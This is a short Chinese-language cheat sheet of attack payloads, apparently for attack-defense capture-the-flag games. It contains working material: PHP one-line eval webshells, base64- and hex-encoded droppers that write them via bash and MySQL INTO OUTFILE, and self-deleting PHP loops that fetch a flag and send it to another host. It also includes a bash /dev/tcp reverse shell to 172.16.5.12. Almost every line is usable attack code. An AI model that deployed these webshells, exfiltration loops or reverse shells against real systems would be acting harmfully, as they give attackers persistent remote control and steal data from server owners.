/**
caidao一句话文件：.c.php .c.jsp
caidao一句话密码:o

unlink文件：.u.php .uf.php
flag.txt: .o

file_put_contents文件：.f.php
*/

1、直接输出flag
<?php echo file_get_contents("http://10.0.0.2");?>
-----
<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://10.0.0.2');echo curl_exec($ch);?>

2、unlink马
(1)写flag到本地文件中
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=(file_get_contents('http://10.0.0.2'));
    file_put_contents("/var/www/8012/.o",$f);
    sleep(5);
}
?>
---
(2)反弹flag
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=file_get_contents('http://10.0.0.2');
    file_get_contents("http://172.16.5.1:6061?f=".$f);
    sleep(10);
}
?>

3、写一句话后门
<?php @eval($_POST["o"]); ?>
<?php file_put_contents("/var/www/8012/.c.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWyJvIl0pOyA/Pg=="));?> 

4、反弹shell
/bin/bash -c '/bin/bash </dev/tcp/172.16.5.12/6062 1>&0 2>&0'

5、bash写一句话
<?php @eval($_POST["o"]); ?>
echo PD9waHAgQGV2YWwoJF9QT1NUWyJvIl0pOyA/Pg== | /usr/bin/base64 -d > /var/www/html/.c.php

6、mysql写一句话
select unhex('3C3F70687020406576616C28245F504F53545B226F225D293B203F3E') into outfile '/var/www/html/test/.c.php';
select load_file('/var/www/html/test/1.php');
